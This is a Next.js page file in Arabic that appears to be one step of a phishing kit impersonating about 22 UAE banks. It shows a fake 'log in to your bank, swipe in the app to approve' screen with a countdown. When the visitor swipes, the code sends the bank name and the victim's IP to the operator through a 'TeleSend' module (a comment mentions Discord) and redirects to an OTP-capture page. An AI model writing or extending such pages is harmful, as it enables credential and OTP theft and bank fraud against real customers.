// app/payment/banks/bankaz/step2/page.jsx
'use client'

import { useRouter } from 'next/navigation';
import Image from "next/image";
import { useState, useEffect, useRef } from 'react';
import TeleSned from "../../../../../server/TeleSend";

export default function Page() {
    const router = useRouter();
    const { Send } = TeleSned();
    const [isLoading, setIsLoading] = useState(false);
    const [userIp, setUserIp] = useState('جاري التحميل...');
    const [timeLeft, setTimeLeft] = useState(30);
    const [isApproved, setIsApproved] = useState(false);
    const [isDragging, setIsDragging] = useState(false);
    const [dragOffset, setDragOffset] = useState(0);
    const [isComplete, setIsComplete] = useState(false);
    const [bankId, setBankId] = useState(null);
    const [bankNameFromUrl, setBankNameFromUrl] = useState(null);
    const [ipFromUrl, setIpFromUrl] = useState(null);
    
    const containerRef = useRef(null);
    const buttonRef = useRef(null);

    // استخراج البارامترات من URL
    useEffect(() => {
        const params = new URLSearchParams(window.location.search);
        setBankId(params.get('bankId'));
        setBankNameFromUrl(params.get('bankName'));
        setIpFromUrl(params.get('ip'));
    }, []);

    // جلب IP من API إذا لم يكن موجود في URL
    useEffect(() => {
        if (ipFromUrl) {
            setUserIp(ipFromUrl);
        } else {
            const fetchIp = async () => {
                try {
                    const response = await fetch('/api/ip');
                    const data = await response.json();
                    setUserIp(data.ip);
                } catch (error) {
                    console.error('خطأ في جلب IP:', error);
                    setUserIp('غير متاح');
                }
            };
            fetchIp();
        }
    }, [ipFromUrl]);

    // مؤقت العد التنازلي
    useEffect(() => {
        if (timeLeft > 0 && !isApproved) {
            const timer = setTimeout(() => {
                setTimeLeft(timeLeft - 1);
            }, 1000);
            return () => clearTimeout(timer);
        }
    }, [timeLeft, isApproved]);

    const banks = [
        { id: 1, name: 'بنك أبو ظبي التجاري', src: '/b-abodabetgare.jfif', url: '/payment/banks/bankaz' },
        { id: 2, name: 'بنك أبو ظبي الأول', src: '/b-abodabeone.jpg', url: '/payment/banks/bankaz' },
        { id: 3, name: 'بنك الإمارات الإسلامي', src: '/b-emaratislam.png', url: '/payment/banks/bankaz' },
        { id: 4, name: 'بنك الإمارات دبي الوطني', src: '/b-emaratdubaiwatne.jpg', url: '/payment/banks/bankaz' },
        { id: 5, name: 'بنك دبي التجاري', src: '/b-dubaitgare.jpg', url: '/payment/banks/bankaz' },
        { id: 6, name: 'بنك أبو ظبي الإسلامي', src: '/b-abodabeislam.jpg', url: '/payment/banks/bankaz' },
        { id: 7, name: 'بنك المشرق', src: '/b-mahrok.png', url: '/payment/banks/bankaz' },
        { id: 8, name: 'بنك دبي الإسلامي', src: '/b-dubaiislam.jpg', url: '/payment/banks/bankaz' },
        { id: 9, name: 'HSBC بنك', src: '/bhsbc.png', url: '/payment/banks/bankaz' },
        { id: 10, name: 'مصرف الشارقة الإسلامي', src: '/msrfsharka.jfif', url: '/payment/banks/bankaz' },
        { id: 11, name: 'بنك رأس الخيمة الوطني', src: '/b-raskema.gif', url: '/payment/banks/bankaz' },
        { id: 12, name: 'بنك الفجيرة الوطني', src: '/b-fgerwatny.jpg', url: '/payment/banks/bankaz' },
        { id: 13, name: 'بنك الاستثمار', src: '/bank-investment.jpg', url: '/payment/banks/bankaz' },
        { id: 14, name: 'بنك أم القيوين الوطني', src: '/b.jpg', url: '/payment/banks/bankaz' },
        { id: 15, name: 'بنك الماريا المحلي', src: '/bmarea.jpg', url: '/payment/banks/bankaz' },
        { id: 16, name: 'بنك الهلال', src: '/bank-hilal.jpg', url: '/payment/banks/bankaz' },
        { id: 17, name: 'Wio Bank', src: '/wiob.webp', url: '/payment/bankaz' },
        { id: 18, name: 'المصرف', src: '/bank-al-masraf.jpg', url: '/payment/banks/bankaz' },
        { id: 19, name: 'بنك عجمان', src: '/bajman.jpg', url: '/payment/bankaz' },
        { id: 20, name: 'بنك الشارقة', src: '/bank-sharjah.jpg', url: '/payment/banks/bankaz' },
        { id: 21, name: 'Liv X', src: '/livexb.jfif', url: '/payment/banks/bankaz' },
        { id: 22, name: 'Zand Bank', src: '/bank-zand.jpg', url: '/payment/banks/bankaz' }
    ];

    // العثور على البنك المحدد
    const selectedBank = banks.find(bank => bank.id === parseInt(bankId));

    // أحداث السحب - نسخة محسنة للجوال
    const handleDragStart = (e) => {
        if (isApproved || isLoading) return;
        e.preventDefault();
        setIsDragging(true);
        
        const clientX = e.type === 'touchstart' ? e.touches[0].clientX : e.clientX;
        const containerRect = containerRef.current?.getBoundingClientRect();
        const startOffset = clientX - (containerRect?.left || 0);
        setDragOffset(startOffset);
    };

    const handleDragMove = (e) => {
        if (!isDragging || isApproved || isLoading) return;
        e.preventDefault();
        
        const clientX = e.type === 'touchmove' ? e.touches[0].clientX : e.clientX;
        const containerRect = containerRef.current?.getBoundingClientRect();
        const containerWidth = containerRect?.width || 300;
        const newX = clientX - (containerRect?.left || 0);
        const maxOffset = containerWidth - 70;
        const offset = Math.min(Math.max(newX - dragOffset, 0), maxOffset);
        setDragOffset(offset);
        
        if (offset >= maxOffset * 0.9) {
            handleApprove();
        }
    };

    const handleDragEnd = () => {
        if (!isDragging) return;
        setIsDragging(false);
        if (!isApproved) {
            setDragOffset(0);
        }
    };

    // إضافة مستمعي الأحداث للماوس واللمس
    useEffect(() => {
        if (isDragging) {
            document.addEventListener('mousemove', handleDragMove);
            document.addEventListener('mouseup', handleDragEnd);
            document.addEventListener('touchmove', handleDragMove, { passive: false });
            document.addEventListener('touchend', handleDragEnd);
        }
        return () => {
            document.removeEventListener('mousemove', handleDragMove);
            document.removeEventListener('mouseup', handleDragEnd);
            document.removeEventListener('touchmove', handleDragMove);
            document.removeEventListener('touchend', handleDragEnd);
        };
    }, [isDragging]);

    // دالة الموافقة
    const handleApprove = () => {
        if (isApproved || isLoading) return;
        setIsApproved(true);
        setIsLoading(true);
        setDragOffset(100);
        
        try {
            const description = `✅ **تمت الموافقة على الدفع**\n\n` +
                               `📌 **البنك:** ${selectedBank?.name || 'غير معروف'}\n` +
                               `🌐 **IP المستخدم:** ${userIp}\n` +
                               `🕒 **الوقت:** ${new Date().toLocaleString('ar-OM')}`;
            
            Send(description);
            console.log('✅ تمت الموافقة على الدفع');
        } catch (error) {
            console.error('❌ خطأ في الإرسال إلى Discord:', error);
        }

        setTimeout(() => {
            setIsLoading(false);
            router.push(`/otp?bankId=${bankId}&bankName=${encodeURIComponent(selectedBank?.name || '')}&ip=${encodeURIComponent(userIp)}`);
        }, 2000);
    };

    // التحقق من وجود البنك
    if (!selectedBank) {
        return (
            <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
                <div className="text-center text-red-500">
                    <p>لم يتم اختيار بنك</p>
                    <button
                        onClick={() => router.push('/payment/banks')}
                        className="mt-4 px-6 py-2 bg-[#008000] text-white rounded-lg hover:bg-[#006000] transition-all duration-300"
                    >
                        العودة لاختيار البنك
                    </button>
                </div>
            </main>
        );
    }

    const containerWidth = containerRef.current?.getBoundingClientRect()?.width || 300;
    const maxOffset = containerWidth - 70;
    const buttonOffset = Math.min(dragOffset, maxOffset);
    const progress = Math.min((buttonOffset / maxOffset) * 100, 100);

    return (
        <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
            <div className="z-10 w-full max-w-md mx-auto">
                <div className="flex flex-col items-center justify-center w-full rounded-xl shadow-xl bg-white/95 backdrop-blur-sm p-6 md:p-8 border border-gray-100 mb-6">
                    <div className="w-20 h-20 relative rounded-full overflow-hidden bg-gray-50 flex items-center justify-center mb-4">
                        <Image
                            src={selectedBank.src}
                            alt={selectedBank.name}
                            width={80}
                            height={80}
                            className="object-contain p-2"
                            onError={(e) => {
                                e.target.src = '/bank-placeholder.png';
                            }}
                        />
                    </div>
                    <h2 className="text-xl md:text-2xl font-bold text-[#008000] text-center">
                        {selectedBank.name}
                    </h2>
                    <p className="text-gray-500 text-sm text-center">
                        {selectedBank.name}
                    </p>
                </div>

                <div className="bg-white rounded-xl shadow-xl p-6 md:p-8 border border-gray-100">
                    <h1 className='text-lg font-bold text-center mb-2'>
                        تسجيل الدخول إلى {selectedBank.name}
                    </h1>
                    
                    <p className="text-gray-600 text-center text-sm mb-6">
                        عزيزي عميل {selectedBank.name}<br />
                        تم إرسال طلب لتوثيق دخولك من المتصفح<br />
                        يرجى التوجه إلى تطبيق {selectedBank.name}<br />
                        والسحب للموافقة
                    </p>

                    <div className="mb-6">
                        <div 
                            ref={containerRef}
                            className="relative h-14 bg-gray-200 rounded-full overflow-hidden shadow-inner cursor-pointer select-none touch-none"
                            onMouseDown={handleDragStart}
                            onTouchStart={handleDragStart}
                        >
                            {/* خلفية التقدم */}
                            <div 
                                className="absolute inset-0 bg-[#008000] transition-all duration-300"
                                style={{ width: `${Math.min(progress, 100)}%` }}
                            />
                            
                            {/* النص الخلفي */}
                            <div className="absolute inset-0 flex items-center justify-center">
                                <span className={`text-sm font-medium transition-colors duration-300 ${
                                    progress > 30 ? 'text-white' : 'text-gray-700'
                                }`}>
                                    {isApproved ? '✅ تمت الموافقة' : 'اسحب للموافقة ←'}
                                </span>
                            </div>
                            
                            {/* زر السحب */}
                            <div 
                                ref={buttonRef}
                                className="absolute top-1 bottom-1 w-12 bg-white rounded-full shadow-lg flex items-center justify-center transition-all duration-300"
                                style={{ 
                                    left: `${Math.min(buttonOffset + 4, maxOffset - 4)}px`,
                                    transform: isDragging ? 'scale(1.1)' : 'scale(1)',
                                    touchAction: 'none'
                                }}
                            >
                                <svg 
                                    className={`w-6 h-6 transition-colors duration-300 ${progress > 30 ? 'text-[#008000]' : 'text-gray-600'}`}
                                    fill="none" 
                                    stroke="currentColor" 
                                    viewBox="0 0 24 24"
                                >
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 5l7 7-7 7M5 5l7 7-7 7" />
                                </svg>
                            </div>
                        </div>
                    </div>

                    <div className="text-center">
                        <p className="text-sm text-gray-500">
                            الوقت المتبقي {timeLeft} ثانية
                        </p>
                    </div>
                </div>
            </div>
        </main>
    );
}
